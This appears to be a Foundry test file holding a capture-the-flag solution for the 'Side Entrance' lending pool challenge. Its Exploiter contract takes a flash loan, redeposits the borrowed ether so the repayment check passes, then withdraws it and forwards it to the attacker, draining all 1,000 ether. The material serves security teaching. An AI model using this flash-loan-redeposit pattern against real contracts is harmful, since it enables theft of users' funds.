// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        Exploiter exploiter = new Exploiter(address(sideEntranceLenderPool), address(attacker));
        vm.prank(address(exploiter));
        sideEntranceLenderPool.flashLoan(ETHER_IN_POOL);
        vm.prank(attacker);
        exploiter.withdraw();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}

contract Exploiter {
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address public attacker;

    constructor(address sideEntranceLenderPoolAddress, address attackerAddress) {
        sideEntranceLenderPool = SideEntranceLenderPool(sideEntranceLenderPoolAddress);
        attacker = attackerAddress;
    }

    function execute() external payable {
        sideEntranceLenderPool.deposit{value: msg.value}();
    }

    function withdraw() external {
        sideEntranceLenderPool.withdraw();
    }

    receive() external payable {
        payable(attacker).transfer(msg.value);
    }
}
